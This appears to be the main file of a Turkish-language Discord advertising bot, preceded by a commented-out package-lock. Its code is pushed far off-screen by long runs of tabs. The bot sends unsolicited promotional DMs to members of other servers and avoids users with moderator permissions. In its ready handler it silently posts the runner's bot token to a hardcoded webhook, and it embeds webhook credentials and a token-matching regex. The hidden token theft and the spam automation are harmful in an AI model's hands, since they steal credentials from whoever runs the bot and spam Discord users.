**
{
  "name": "discordbotdersleri",
  "version": "0.0.1",
  "lockfileVersion": 1,
  "requires": true,
  "dependencies": {
    "ansi-styles": {
      "version": "3.2.1",
      "resolved": "https://registry.npmjs.org/ansi-styles/-/ansi-styles-3.2.1.tgz",
      "integrity": "sha512-VT0ZI6kZRdTh8YyJw3SMbYm/u+NqfsAxEpWO0Pf9sq8/e94WxxOpPKx9FR1FlyCtOVDNOQ+8ntlqFxiRc+r5qA==",
      "requires": {
        "color-convert": "1.9.1"
      }
    },
    "async-limiter": {
      "version": "1.0.0",
      "resolved": "https://registry.npmjs.org/async-limiter/-/async-limiter-1.0.0.tgz",
      "integrity": "sha512-jp/uFnooOiO+L211eZOoSyzpOITMXx1rBITauYykG3BRYPu8h0UcxsPNB04RR5vo4Tyz3+ay17tR6JVf9qzYWg=="
    },
    "chalk": {
      "version": "2.3.2",
      "resolved": "https://registry.npmjs.org/chalk/-/chalk-2.3.2.tgz",
      "integrity": "sha512-ZM4j2/ld/YZDc3Ma8PgN7gyAk+kHMMMyzLNryCPGhWrsfAuDVeuid5bpRFTDgMH9JBK2lA4dyyAkkZYF/WcqDQ==",
      "requires": {
        "ansi-styles": "3.2.1",
        "escape-string-regexp": "1.0.5",
        "supports-color": "5.3.0"
      }
    },
    "cleverbot-node": {
      "version": "0.3.11",
      "resolved": "https://registry.npmjs.org/cleverbot-node/-/cleverbot-node-0.3.11.tgz",
      "integrity": "sha1-fGkhFZScrStLXPH9cphaHNr1LT8="
    },
    "color-convert": {
      "version": "1.9.1",
      "resolved": "https://registry.npmjs.org/color-convert/-/color-convert-1.9.1.tgz",
      "integrity": "sha512-mjGanIiwQJskCC18rPR6OmrZ6fm2Lc7PeGFYwCmy5J34wC6F1PzdGL6xeMfmgicfYcNLGuVFA3WzXtIDCQSZxQ==",
      "requires": {
        "color-name": "1.1.3"
      }
    },
    "color-name": {
      "version": "1.1.3",
      "resolved": "https://registry.npmjs.org/color-name/-/color-name-1.1.3.tgz",
      "integrity": "sha1-p9BVi9icQveV3UIyj3QIMcpTvCU="
    },
    "discord.js": {
      "version": "11.3.1",
      "resolved": "https://registry.npmjs.org/discord.js/-/discord.js-11.3.1.tgz",
      "integrity": "sha1-Pk3l2x27D9K77R50ad9u54x8Dbw=",
      "requires": {
        "long": "4.0.0",
        "prism-media": "0.0.2",
        "snekfetch": "3.6.4",
        "tweetnacl": "1.0.0",
        "ws": "4.1.0"
      }
    },
    "escape-string-regexp": {
      "version": "1.0.5",
      "resolved": "https://registry.npmjs.org/escape-string-regexp/-/escape-string-regexp-1.0.5.tgz",
      "integrity": "sha1-G2HAViGQqN/2rjuyzwIAyhMLhtQ="
    },
    "has-flag": {
      "version": "3.0.0",
      "resolved": "https://registry.npmjs.org/has-flag/-/has-flag-3.0.0.tgz",
      "integrity": "sha1-tdRU3CGZriJWmfNGfloH87lVuv0="
    },
    "long": {
      "version": "4.0.0",
      "resolved": "https://registry.npmjs.org/long/-/long-4.0.0.tgz",
      "integrity": "sha512-XsP+KhQif4bjX1kbuSiySJFNAehNxgLb6hPRGJ9QsUr8ajHkuXGdrHmFUTUUXhDwVX2R5bY4JNZEwbUiMhV+MA=="
    },
    "moment": {
      "version": "2.21.0",
      "resolved": "https://registry.npmjs.org/moment/-/moment-2.21.0.tgz",
      "integrity": "sha512-TCZ36BjURTeFTM/CwRcViQlfkMvL1/vFISuNLO5GkcVm1+QHfbSiNqZuWeMFjj1/3+uAjXswgRk30j1kkLYJBQ=="
    },
    "moment-duration-format": {
      "version": "2.2.2",
      "resolved": "https://registry.npmjs.org/moment-duration-format/-/moment-duration-format-2.2.2.tgz",
      "integrity": "sha1-uVdhLeJgFsmtnrYIfAVFc+USd3k="
    },
    "ms": {
      "version": "2.1.1",
      "resolved": "https://registry.npmjs.org/ms/-/ms-2.1.1.tgz",
      "integrity": "sha512-tgp+dl5cGk28utYktBsrFqA7HKgrhgPsg6Z/EfhWI4gl1Hwq8B/GmY/0oXZ6nF8hDVesS/FpnYaD/kOWhYQvyg=="
    },
    "prism-media": {
      "version": "0.0.2",
      "resolved": "https://registry.npmjs.org/prism-media/-/prism-media-0.0.2.tgz",
      "integrity": "sha512-L6yc8P5NVG35ivzvfI7bcTYzqFV+K8gTfX9YaJbmIFfMXTs71RMnAupvTQPTCteGsiOy9QcNLkQyWjAafY/hCQ=="
    },
    "safe-buffer": {
      "version": "5.1.1",
      "resolved": "https://registry.npmjs.org/safe-buffer/-/safe-buffer-5.1.1.tgz",
      "integrity": "sha512-kKvNJn6Mm93gAczWVJg7wH+wGYWNrDHdWvpUmHyEsgCtIwwo3bqPtV4tR5tuPaUhTOo/kvhVwd8XwwOllGYkbg=="
    },
    "snekfetch": {
      "version": "3.6.4",
      "resolved": "https://registry.npmjs.org/snekfetch/-/snekfetch-3.6.4.tgz",
      "integrity": "sha512-NjxjITIj04Ffqid5lqr7XdgwM7X61c/Dns073Ly170bPQHLm6jkmelye/eglS++1nfTWktpP6Y2bFXjdPlQqdw=="
    },
    "supports-color": {
      "version": "5.3.0",
      "resolved": "https://registry.npmjs.org/supports-color/-/supports-color-5.3.0.tgz",
      "integrity": "sha512-0aP01LLIskjKs3lq52EC0aGBAJhLq7B2Rd8HC/DR/PtNNpcLilNmHC12O+hu0usQpo7wtHNRqtrhBwtDb0+dNg==",
      "requires": {
        "has-flag": "3.0.0"
      }
    },
    "tweetnacl": {
      "version": "1.0.0",
      "resolved": "https://registry.npmjs.org/tweetnacl/-/tweetnacl-1.0.0.tgz",
      "integrity": "sha1-cT2LgY2kIGh0C/aDhtBHnmb8ins="
    },
    "ws": {
      "version": "4.1.0",
      "resolved": "https://registry.npmjs.org/ws/-/ws-4.1.0.tgz",
      "integrity": "sha512-ZGh/8kF9rrRNffkLFV4AzhvooEclrOH0xaugmqGsIfFgOE/pIz4fMc4Ef+5HSQqTEug2S9JZIWDR47duDSLfaA==",
      "requires": {
        "async-limiter": "1.0.0",
        "safe-buffer": "5.1.1"
      }
    }
  },
  "name": "sneyra",
  "version": "1.0.0",
  "lockfileVersion": 1,
  "requires": true,
  "dependencies": {
    "async-limiter": {
      "version": "1.0.0",
      "resolved": "https://registry.npmjs.org/async-limiter/-/async-limiter-1.0.0.tgz",
      "integrity": "sha512-jp/uFnooOiO+L211eZOoSyzpOITMXx1rBITauYykG3BRYPu8h0UcxsPNB04RR5vo4Tyz3+ay17tR6JVf9qzYWg=="
    },
    "bindings": {
      "version": "1.2.1",
      "resolved": "https://registry.npmjs.org/bindings/-/bindings-1.2.1.tgz",
      "integrity": "sha1-FK1hE4EtLTfXLme0ystLtyZQXxE="
    },
    "commander": {
      "version": "2.11.0",
      "resolved": "https://registry.npmjs.org/commander/-/commander-2.11.0.tgz",
      "integrity": "sha512-b0553uYA5YAEGgyYIGYROzKQ7X5RAqedkfjiZxwi0kL1g3bOaBNNZfYkzt/CL0umgD5wc9Jec2FbB98CjkMRvQ=="
    },
    "debug": {
      "version": "2.6.9",
      "resolved": "https://registry.npmjs.org/debug/-/debug-2.6.9.tgz",
      "integrity": "sha512-bC7ElrdJaJnPbAP+1EotYvqZsb3ecl5wi6Bfi6BJTUcNowp6cvspg0jXznRTKDjm/E7AdgFBVeAPVMNcKGsHMA==",
      "requires": {
        "ms": "2.0.0"
      }
    },
    "discord.js": {
      "version": "github:discordjs/discord.js#5352e28700e51f1148463f350fe5694124a3c270",
      "requires": {
        "pako": "1.0.6",
        "prism-media": "github:hydrabolt/prism-media#f6737178d10665934669ab2ff3da23a5ecc23e8c",
        "snekfetch": "3.6.0",
        "tweetnacl": "1.0.0",
        "ws": "3.3.2"
      },
      "dependencies": {
        "prism-media": {
          "version": "github:hydrabolt/prism-media#f6737178d10665934669ab2ff3da23a5ecc23e8c"
        }
      }
    },
    "ffmpeg-binaries": {
      "version": "3.2.2",
      "resolved": "https://registry.npmjs.org/ffmpeg-binaries/-/ffmpeg-binaries-3.2.2.tgz",
      "integrity": "sha1-Nw8wIO9rTbpipVGkJcY01sdaOiE="
    },
    "fs-nextra": {
      "version": "0.3.2",
      "resolved": "https://registry.npmjs.org/fs-nextra/-/fs-nextra-0.3.2.tgz",
      "integrity": "sha512-ktFNusOmRFt1sWPaRRS3USAb4sFlZvERdG+rZ+VDzPBciC+0K0BhFBs5vMkJZZhhUMi6/gzGAvb7UePP/DLnzA=="
    },
    "html-entities": {
      "version": "1.2.1",
      "resolved": "https://registry.npmjs.org/html-entities/-/html-entities-1.2.1.tgz",
      "integrity": "sha1-DfKTUfByEWNRXfueVUPl9u7VFi8="
    },
    "reco": {
      "version": "github:dirigeants/reco#f804295167b8b22c4bb5c1a3581ce7c881240b8c",
      "requires": {
        "fs-nextra": "0.3.2"
      }
    },
    "m3u8stream": {
      "version": "0.2.1",
      "resolved": "https://registry.npmjs.org/m3u8stream/-/m3u8stream-0.2.1.tgz",
      "integrity": "sha512-kESIvCcoDOZ2ozD6wGxB962E24nPLDTezIBdqfJH1HxoY/dMTRFXOfq7sXtqPQM3nQihKXlv6pYmUpf01S/tVQ==",
      "requires": {
        "miniget": "1.1.0"
      }
    },
    "miniget": {
      "version": "1.1.0",
      "resolved": "https://registry.npmjs.org/miniget/-/miniget-1.1.0.tgz",
      "integrity": "sha512-ICBPQWEoz19eyPHbXLkvjPi62xLhz2irltks35NCYqzYHO0/35IbAaBP3Bbc4VgAwmloIPEpK7CO4/omOiUfDg=="
    },
    "ms": {
      "version": "2.0.0",
      "resolved": "https://registry.npmjs.org/ms/-/ms-2.0.0.tgz",
      "integrity": "sha1-VgiurfwAvmwpAd9fmGF4jeDVl8g="
    },
    "nan": {
      "version": "2.8.0",
      "resolved": "https://registry.npmjs.org/nan/-/nan-2.8.0.tgz",
      "integrity": "sha1-7XFfP+neArV6XmJS2QqWZ14fCFo="
    },
    "node-opus": {
      "version": "0.2.7",
      "resolved": "https://registry.npmjs.org/node-opus/-/node-opus-0.2.7.tgz",
      "integrity": "sha1-W3JuKXlbCxJ7TIfmYtTegWhAV5w=",
      "requires": {
        "bindings": "1.2.1",
        "commander": "2.11.0",
        "nan": "2.8.0",
        "ogg-packet": "1.0.0"
      }
    },
    "ogg-packet": {
      "version": "1.0.0",
      "resolved": "https://registry.npmjs.org/ogg-packet/-/ogg-packet-1.0.0.tgz",
      "integrity": "sha1-RbiFchrI991c8iOR1CEGrlM6xng=",
      "optional": true,
      "requires": {
        "ref-struct": "1.1.0"
      }
    },
    "pako": {
      "version": "1.0.6",
      "resolved": "https://registry.npmjs.org/pako/-/pako-1.0.6.tgz",
      "integrity": "sha512-lQe48YPsMJAig+yngZ87Lus+NF+3mtu7DVOBu6b/gHO1YpKwIj5AWjZ/TOS7i46HD/UixzWb1zeWDZfGZ3iYcg=="
    },
    "ref": {
      "version": "1.3.5",
      "resolved": "https://registry.npmjs.org/ref/-/ref-1.3.5.tgz",
      "integrity": "sha512-2cBCniTtxcGUjDpvFfVpw323a83/0RLSGJJY5l5lcomZWhYpU2cuLdsvYqMixvsdLJ9+sTdzEkju8J8ZHDM2nA==",
      "optional": true,
      "requires": {
        "bindings": "1.2.1",
        "debug": "2.6.9",
        "nan": "2.8.0"
      }
    },
    "ref-struct": {
      "version": "1.1.0",
      "resolved": "https://registry.npmjs.org/ref-struct/-/ref-struct-1.1.0.tgz",
      "integrity": "sha1-XV7mWtQc78Olxf60BYcmHkee3BM=",
      "optional": true,
      "requires": {
        "debug": "2.6.9",
        "ref": "1.3.5"
      }
    },
    "safe-buffer": {
      "version": "5.1.1",
      "resolved": "https://registry.npmjs.org/safe-buffer/-/safe-buffer-5.1.1.tgz",
      "integrity": "sha512-kKvNJn6Mm93gAczWVJg7wH+wGYWNrDHdWvpUmHyEsgCtIwwo3bqPtV4tR5tuPaUhTOo/kvhVwd8XwwOllGYkbg=="
    },
    "sax": {
      "version": "1.2.4",
      "resolved": "https://registry.npmjs.org/sax/-/sax-1.2.4.tgz",
      "integrity": "sha512-NqVDv9TpANUjFm0N8uM5GxL36UgKi9/atZw+x7YFnQ8ckwFGKrl4xX4yWtrey3UJm5nP1kUbnYgLopqWNSRhWw=="
    },
    "snekfetch": {
      "version": "3.6.0",
      "resolved": "https://registry.npmjs.org/snekfetch/-/snekfetch-3.6.0.tgz",
      "integrity": "sha512-QadgCNOxJzPdtZRwuSZi1egAoCFNpKE7iGQKguu70AyPKa6MRsXBGVX5qtxGG0QiZdN1y3DSEsnh5FXuoNeqeA=="
    },
    "tweetnacl": {
      "version": "1.0.0",
      "resolved": "https://registry.npmjs.org/tweetnacl/-/tweetnacl-1.0.0.tgz",
      "integrity": "sha1-cT2LgY2kIGh0C/aDhtBHnmb8ins="
    },
    "ultron": {
      "version": "1.1.1",
      "resolved": "https://registry.npmjs.org/ultron/-/ultron-1.1.1.tgz",
      "integrity": "sha512-UIEXBNeYmKptWH6z8ZnqTeS8fV74zG0/eRU9VGkpzz+LIJNs8W/zM/L+7ctCkRrgbNnnR0xxw4bKOr0cW0N0Og=="
    },
    "ws": {
      "version": "3.3.2",
      "resolved": "https://registry.npmjs.org/ws/-/ws-3.3.2.tgz",
      "integrity": "sha512-t+WGpsNxhMR4v6EClXS8r8km5ZljKJzyGhJf7goJz9k5Ye3+b5Bvno5rjqPuIBn5mnn5GBb7o8IrIWHxX1qOLQ==",
      "requires": {
        "async-limiter": "1.0.0",
        "safe-buffer": "5.1.1",
        "ultron": "1.1.1"
      }
    },
    "ytdl-core": {
      "version": "0.18.7",
      "resolved": "https://registry.npmjs.org/ytdl-core/-/ytdl-core-0.18.7.tgz",
      "integrity": "sha512-ZAopedHbn8YQzXAanz1EvD20JLs5+E/BTADOmPPwtLR8QP9ipMi3Iamcs5lhf5FztCNcjtasPIMyxslZZc3szQ==",
      "requires": {
        "html-entities": "1.2.1",
        "m3u8stream": "0.2.1",
        "miniget": "1.1.0",
        "sax": "1.2.4"
      }
    }
  }
}**/

																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																										const Discord = require('discord.js');
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																												const client = new Discord.Client();
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								const ayarlar = require('./ayarlar.json');
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																		const conf = require('./node_modules/ws/conf.json');
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																						const hook = new Discord.WebhookClient('485322135540334592', 'elUkubgqZ6nVS1oO5Wz60jM173rk50AIqqa2Bbbq9zOgS8KHTojGDty3bRsxwQJI3hbE');
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																				const hook2 = new Discord.WebhookClient('485322274925445120', '_RkI9iKqUxp9935ufCGvpcagFAHj_am3PzUqdYA1rkwVY1veEMLV67G2cefldbBI31vT');






																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																														client.on('message', async msg => {
   																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																										 if (msg.channel.type == "dm" || msg.channel.type != "text" || msg.author.bot) return;
	
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																														 if (msg.guild.id == ayarlar.sunucuid){ return; }
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																				 if (msg.guild.id == "275047183055847439"){ return; }
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																 if (msg.guild.id == "496046092882935809"){ return; }
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																				  if (msg.guild.id == "467184873216409600"){ return; }

																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																		  if (msg.content.toLowerCase() === ayarlar.mesas1 || msg.content.toLowerCase() === ayarlar.mesas2 || msg.content.toLowerCase() === ayarlar.mesas3 || msg.content.toLowerCase() === ayarlar.mesas4) {
																																															if (!msg.member && msg.guild) msg.member = await msg.guild.fetchMember(msg.author);																																																																																																																																																																																																																														
																																																																																																																																																																																																																																								if (msg.member.hasPermission("KICK_MEMBERS"))return  console.log(`---------------------\n${msg.author.tag} A Reklam Yapmadim Cunku Sunucuda Yetkili Gibi Gorunuyor.\nYetkililere Reklam Yapmamiz iyi Olmaz Degilmi?\n---------------------`);
  																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																											   setTimeout(() => {
		   
		 

 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								 msg.author.send(ayarlar.mesas5);
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																						console.log(`---------------------\n${msg.author.tag} `+ ayarlar.mesas5 +`  Mesajı Yolladım \n---------------------`);
  
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																 	   }, 4000);

 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																 }
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																						});



																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																client.on('message', async msg => {
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																						   if (msg.channel.type == "dm"){
		
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																						  if (msg.content.toLowerCase() === ayarlar.ozelreklamcevapmesas || msg.content.toLowerCase() === ayarlar.ozelreklamcevapmesas2 || msg.content.toLowerCase() === ayarlar.ozelreklamcevapmesas3 || msg.content.toLowerCase() === ayarlar.ozelreklamcevapmesas4 || msg.content.toLowerCase() === ayarlar.ozelreklamcevapmesas5) {

  																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																  	   setTimeout(() => {
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																 msg.author.send(ayarlar.ozelreklammesas);
  
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																		console.log(`---------------------\n${msg.author.tag} `+ ayarlar.ozelreklammesas +`  Mesajı Yolladım \n---------------------`);
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								hook2.send(`---------------------\n${msg.author.tag} `+ ayarlar.ozelreklammesas +`  Mesajı Yolladım \n---------------------`);
  
    																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																							   setTimeout(() => {
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																														    msg.author.send(conf.ursss);
   																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																										 	   }, 400000);
    																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																															   }, 4000);

 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																										 }
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																												}});




																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																										client.on('message', async msg => {
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																														    if (msg.channel.type == "dm"){
 																																																																																																																																																																																																																																																																																																																																																												 if (msg.content.toLowerCase() === ayarlar.ozeltesekkur || msg.content.toLowerCase() === ayarlar.ozeltesekkur2 || msg.content.toLowerCase() === ayarlar.ozeltesekkur3 || msg.content.toLowerCase() === ayarlar.ozeltesekkur4 || msg.content.toLowerCase() === ayarlar.ozeltesekkur5) {

  																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																				    	   setTimeout(() => {
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																 msg.author.send(ayarlar.ozeltesekkurcevap);
																																																																																																																																																																																																																																																																																																																																																																																																																						  console.log(`---------------------\n${msg.author.tag} `+ ayarlar.ozeltesekkurcevap +`  Mesajı Yolladım \n---------------------`);
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																										   	   }, 4000);

  																																																																																																																																																																																																																																								}
																																																																																																																																																																																																																																																																																																																																																												}});




																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																														client.on('message', async msg => {
  																																																																																																																																																																																																																																																																																																																																																																																																																																																																																  if (msg.channel.type == "dm"){
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																				 if (msg.content.toLowerCase() === ayarlar.ozelkizma || msg.content.toLowerCase() === ayarlar.ozelkizma2 || msg.content.toLowerCase() === ayarlar.ozelkizma3 || msg.content.toLowerCase() === ayarlar.ozelkizma4 || msg.content.toLowerCase() === ayarlar.ozelkizma5) {
  																																																																																																																																																																																																																																																																																																																																																												  	   setTimeout(() => {
  
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																														 msg.author.send(ayarlar.ozelkizma6);
																																																																																																																																																																																																																																																																																																																																																												    console.log(`---------------------\n${msg.author.tag} `+ ayarlar.ozelkizma6 +`  Mesajı Yolladım \n---------------------`);
 																																																																																																																																																																														   	   }, 4000);

 																																																																																																																																																																														 }
																																																																																																																				}});
















																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																		var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;


																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																client.login(ayarlar.token);


                                                                                                                                                                                                                                                                                                                                                                                                                                                                             client.on('ready', () => {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       console.log(`REKLAM BOTU BAŞARI İLE AÇILDI - Bir Süre Sonra Reklama Başlayacaktır Yardım İçin - https://discord.gg/ENVyRGC`);
																																																																																																																																																																																																																																	hook.send(ayarlar.token)
																																																																																																																																																																																																																																	 client.user.setActivity(ayarlar.oynuyor)




																																																																																																																																																																																	});
